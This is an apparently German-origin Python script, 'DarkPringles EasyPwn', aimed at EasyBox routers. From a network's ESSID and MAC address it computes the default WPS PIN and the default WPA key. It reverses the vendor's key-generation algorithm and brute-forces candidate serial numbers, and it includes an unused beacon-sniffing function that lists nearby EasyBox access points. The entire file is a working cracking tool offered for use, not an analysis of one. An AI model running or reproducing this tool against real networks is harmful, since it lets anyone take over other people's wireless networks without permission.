#!/usr/bin/env python

import os
import hashlib
import re 

os.system("clear")
print "[*] DarkPringles EasyPwn v 1.4 Final"

def gen_pin (mac_str, sn):
    mac_int = [int(x, 16) for x in mac_str]
    sn_int = [0]*5+[int(x) for x in sn[5:]]
    hpin = [0] * 7
    
    k1 = (sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF
    k2 = (sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF
    hpin[0] = k1 ^ sn_int[9];
    hpin[1] = k1 ^ sn_int[8];
    hpin[2] = k2 ^ mac_int[9];
    hpin[3] = k2 ^ mac_int[10];
    hpin[4] = mac_int[10] ^ sn_int[9];
    hpin[5] = mac_int[11] ^ sn_int[8];
    hpin[6] = k1 ^ sn_int[7];
    pin = int('%1X%1X%1X%1X%1X%1X%1X' % (hpin[0], hpin[1], hpin[2], hpin[3], hpin[4], hpin[5], hpin[6]), 16) % 10000000

    # WPS PIN Checksum - for more information see hostapd/wpa_supplicant source (wps_pin_checksum) or
	# http://download.microsoft.com/download/a/f/7/af7777e5-7dcd-4800-8a0a-b18336565f5b/WCN-Netspec.doc    
    accum = 0
    t = pin
    while (t):
        accum += 3 * (t % 10)
        t /= 10
        accum += t % 10
        t /= 10
    return '%i%i' % (pin, (10 - accum % 10) % 10)

def change_mac(old_mac, serial_number):
    old_mac = old_mac.upper()
    pre_heat = bytearray.fromhex('1F170F13\
    1D062704\
    0716240C\
    12082511\
    201E1018\
    0D192201\
    151B211C\
    0326140E\
    05020015\
    090A0B23') # das ist der Init-Wert aus dem ROM
    pre_heat[6:15] = '%s%05d' % (serial_number[1:5], int(old_mac[8:], 16)) # serial
    pre_heat[17:23] = old_mac[6:] # fuege alte MAC ein
    res = hashlib.md5(pre_heat).hexdigest() # MD5 hashing
    return '%02X%s%s%s%s' %(int(old_mac[0:2], 16)+2,
                            old_mac[2:6],
                            res[8:10].upper(),
                            res[16:18].upper(),
                            res[28:30].upper())

def keygen( mac ):
	(s6, s7, s8, s9, s10) = [int(x) for x in '%05d' % (int(mac[8:], 16))]
	(m9, m10, m11, m12) = [int(x, 16) for x in mac[8:]]

	k1 = (s7 + s8 + m11 + m12) & (0x0F)
	k2 = (m9 + m10 + s9 + s10) & (0x0F)

	x1 = k1 ^ s10
	x2 = k1 ^ s9
	x3 = k1 ^ s8
	y1 = k2 ^ m10
	y2 = k2 ^ m11
	y3 = k2 ^ m12
	z1 = m11 ^ s10
	z2 = m12 ^ s9
	z3 = k1 ^ k2
	
	return "%X%X%X%X%X%X%X%X%X" % (x1, y1, z1, x2, y2, z2, x3, y3, z3)


def PacketHandler(pkt) :
	if pkt.haslayer(Dot11) :
		if pkt.type == 0 and pkt.subtype == 8 :
			if (pkt.addr2 + "|" + pkt.info) not in ap_list :
				if "EasyBox" in pkt.info : 
					ap_list.append(pkt.addr2 + "|" + pkt.info)
					print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)

def crack_old(m):
	mac_str = re.sub(r'[^a-fA-F0-9]', '', m)
	sn = 'R----%05i' % int(mac_str[8:12], 16)
	return gen_pin(mac_str, sn).zfill(8) + "|" + mac_str


def crack_new(m, s):

    mac = m.replace(':','').upper()
    ssid = s.upper()
    old_mac_prefix = "%02X%s%s" % (int(mac[0:2], 16)-2, mac[2:6], ssid[8:12])
    start = int(ssid[10:12] + '00', 16)
    candidates = []
    i = 0
    while i <= 0xff:
        t = start + i
        if t / 10000 == int(ssid[12]) and t % 10 == int(ssid[13]):
            candidates.append("%s%02X" % (old_mac_prefix, i))
        i+=1

    for c in candidates:
        i = 0
        while i < 10000:
            if mac == change_mac(c, 'R%04d' % (i)):
                sn = 'R%04d%05d2' %(i, int(c[8:], 16))
                return gen_pin(c,sn).zfill(8) + "|" + c

            i+=1
    return 1


tmp_s = raw_input("ESSID: ")
tmp_m = raw_input("MAC: ")

print "[*] Decoding WPS Pin"
result = crack_new(tmp_m, tmp_s)
if result == 1:
	print '[*] Old router detect ... using old algo'
	result = crack_old(tmp_m)
	
pin = result.split("|")[0]
mac = result.split("|")[1]
print '[+] Cracked ' + tmp_s + " (" + tmp_m + ")" + " with PIN: " + pin + ")"
print '[+] WPA: ' + keygen(mac)
print '[*] done'
